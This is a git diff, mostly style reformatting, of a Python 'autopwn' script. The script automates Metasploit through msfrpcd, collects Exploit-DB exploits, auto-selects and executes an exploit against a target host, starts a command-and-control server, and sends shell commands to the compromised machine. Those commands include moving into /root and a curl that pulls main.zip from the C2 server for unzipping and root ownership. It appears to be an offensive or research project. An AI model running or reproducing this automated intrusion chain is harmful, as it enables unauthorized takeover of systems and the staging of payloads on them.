@@ -103,13 +103,13 @@ def getEdbExploit(res=[]):
             ext = str(path.split("/")[-1]).split(".")[-1]
             if not (ext in ["txt", "md"]):
                 plat = str(path.split("/")[5])
-                if ('lin' in plat):
+                if "lin" in plat:
                     command = "cp " + path + " ./edb/lin/" + str(path.split("/")[-1])
-                elif ('mult' in plat):
+                elif "mult" in plat:
                     command = "cp " + path + " ./edb/mult/" + str(path.split("/")[-1])
-                elif ('win' in plat):
+                elif "win" in plat:
                     command = "cp " + path + " ./edb/win/" + str(path.split("/")[-1])
-                elif ('cgi' in plat):
+                elif "cgi" in plat:
                     command = "cp " + path + " ./edb/cgi/" + str(path.split("/")[-1])
                 else:
                     command = "cp " + path + " ./edb/oth/" + str(path.split("/")[-1])
@@ -117,8 +117,8 @@ def getEdbExploit(res=[]):
                 subprocess.run(command, shell=True)
 
 
-def showEdbExploit(exploitPath = "")->None:
-    with open(exploitPath,"r+") as f:
+def showEdbExploit(exploitPath="") -> None:
+    with open(exploitPath, "r+") as f:
         prog = f.readlines()
     pprint.pprint(prog)
 
@@ -153,7 +153,7 @@ def selectExploit(choice=0, titles=[]) -> str:
     return titles[int(choice)][1][:-12]
 
 
-def runMetasploit(reinit=False, show=True) -> MsfRpcClient:
+def runMetasploit(reinit=False, show=True, wait=True) -> MsfRpcClient:
     """Launch metasploit instance and returns associated client
     It is also possible to reinit the db if reinit = True (must be root!!!)
     """
@@ -164,7 +164,8 @@ def runMetasploit(reinit=False, show=True) -> MsfRpcClient:
     proc = subprocess.run(
         "msfrpcd -P yourpassword", shell=True, stdout=redirect, stderr=redirect
     )
-    time.sleep(5)
+    if wait:
+        time.sleep(5)
     LOG("Started process msfrpcd", logfile, "inf")
 
     if reinit:
@@ -203,9 +204,15 @@ def selectPayloadMS(client: MsfRpcClient, payload_fullname: str) -> PayloadModul
     return client.modules.use("payload", payload_fullname)
 
 
-def exploitVuln(Rhosts="192.168.1.45", Lhost="192.168.1.37", auto_mode=False, client=None, modlist=[]) -> None:
+def exploitVuln(
+    Rhosts="192.168.1.45",
+    Lhost="192.168.1.37",
+    auto_mode=False,
+    client=None,
+    modlist=[],
+) -> None:
     """Execute selected payload on the targeted"""
-    if (modlist == []) : 
+    if modlist == []:
         LOG("Error 8 : Module error.", logfile, "err")
         print("[X] Error 8 : Module error, no module.")
         exit(-8)
@@ -220,9 +227,9 @@ def exploitVuln(Rhosts="192.168.1.45", Lhost="192.168.1.37", auto_mode=False, cl
     print("[~] Available payloads :")
     pprint.pprint(plds)
     print("[-1 for autochosing]")
-    if auto_mode :
+    if auto_mode:
         pay_idx = -1
-    else : 
+    else:
         pay_idx = int(input("Which payload do you want to use ? :"))
 
     print("")
@@ -241,19 +248,19 @@ def exploitVuln(Rhosts="192.168.1.45", Lhost="192.168.1.37", auto_mode=False, cl
     print("\n")
 
     for i in payload.missing_required:
-        if (i == "RHOSTS") : 
+        if i == "RHOSTS":
             payload[i] = Rhosts
-        elif (i == "LHOST") : 
+        elif i == "LHOST":
             payload[i] = Lhost
-        else :
+        else:
             payload[i] = input(i + ": ")
 
     for i in exploit.missing_required:
-        if (i == "RHOSTS") : 
+        if i == "RHOSTS":
             exploit[i] = Rhosts
-        elif (i == "LHOST") : 
+        elif i == "LHOST":
             exploit[i] = Lhost
-        else : 
+        else:
             exploit[i] = input(i + ": ")
 
     print(exploit.execute(payload=payload))
@@ -300,7 +307,8 @@ def flushProcesses() -> int:
     return 0
 
 
-def autopwn(Rhosts="192.168.1.45",
+def autopwn(
+    Rhosts="192.168.1.45",
     Lhost="192.168.1.37",
     generic_exploit=True,
     get_edb_exploits=False,
@@ -344,17 +352,16 @@ def autopwn(Rhosts="192.168.1.45",
             LOG("INFO : No exploit found on Metasploit.", logfile, "inf")
             print("[i] INFO : No exploit found on Metasploit.")
         LOG("Displayed possible exploits to user", logfile, "log")
-        
-        
+
     if auto_mode:
         choice = "-1"
         print("[i] Automatic mode activated ! Selecting best exploit for you.")
     else:
         choice = input("[~] Please select an exploit: ")
-  
-    if (choice == "-1") : 
+
+    if choice == "-1":
         choice = str(autoexploit.autochose(metaexploits))
-        if ( choice == "-1") :
+        if choice == "-1":
             choice = input("[~] Could not auto select, please select manually ")
     attack = selectExploit(choice, exploits)
 
@@ -366,7 +373,7 @@ def autopwn(Rhosts="192.168.1.45",
     print("Starting msfrpcd...")
     client = runMetasploit(False)
     modlist = searchModules(client, attack)
-    exploitVuln(Rhosts,Lhost,auto_mode,client, modlist)
+    exploitVuln(Rhosts, Lhost, auto_mode, client, modlist)
 
     print(client.sessions.list)
     print("\n")
@@ -379,7 +386,7 @@ def autopwn(Rhosts="192.168.1.45",
 
         print("[~] Opening local C2 server ...")
         (proc, port) = postexploit.openCtrlSrv(Lhost)
-        ipport = "http://" +Lhost + ":" + str(port)
+        ipport = "http://" + Lhost + ":" + str(port)
     else:
         ipport = "0.0.0.0:0"  # Do not use ip/port if there is no command and control
     print("[V] Pwn complete !!! ")
@@ -388,17 +395,16 @@ def autopwn(Rhosts="192.168.1.45",
 
 if __name__ == "__main__":
 
-    # showEdbExploit("./edb/2444.sh")
-    #showEdbExploit("./edb/2444.sh")
+    # showEdbExploit("./edb/2444.sh")
+    # showEdbExploit("./edb/2444.sh")
 
     if debug == 1:
         print("**** RUNNING IN DEBUG MODE ****")
 
-
     flushProcesses()
-    Rhosts="192.168.1.45"
-    Lhost="192.168.1.37"
-    
+    Rhosts = "192.168.1.45"
+    Lhost = "192.168.1.37"
+
     if len(sys.argv) > 1:
         IP = sys.argv[1]
         Rhosts = sys.argv[1]
@@ -406,7 +412,12 @@ if __name__ == "__main__":
             Lhost = sys.argv[2]
 
     (shell, client, srv) = autopwn(
-        Rhosts=Rhosts,Lhost=Lhost,generic_exploit=True, get_edb_exploits=True, com_and_cont=True, auto_mode=True
+        Rhosts=Rhosts,
+        Lhost=Lhost,
+        generic_exploit=True,
+        get_edb_exploits=True,
+        com_and_cont=True,
+        auto_mode=True,
     )
 
     sequence = [
@@ -419,9 +430,9 @@ if __name__ == "__main__":
         "echo matthislemechan",
     ]
     sequence2 = [
-    	"cd /root",
-    	"pwd",
-    	"ls",
+        "cd /root",
+        "pwd",
+        "ls",
         "curl -s " + srv + "/post/main.zip -o main.zip > /dev/null",
         "unzip main.zip",
         "chown root:root pwnguin-main",
@@ -432,7 +443,7 @@ if __name__ == "__main__":
     ]
     sendCommands(shell, sequence)
     sendCommands(shell, sequence2)
-    
+
     LOG("END OF LOGS", logfile, "crit")
     logfile.close()
     exit(0)
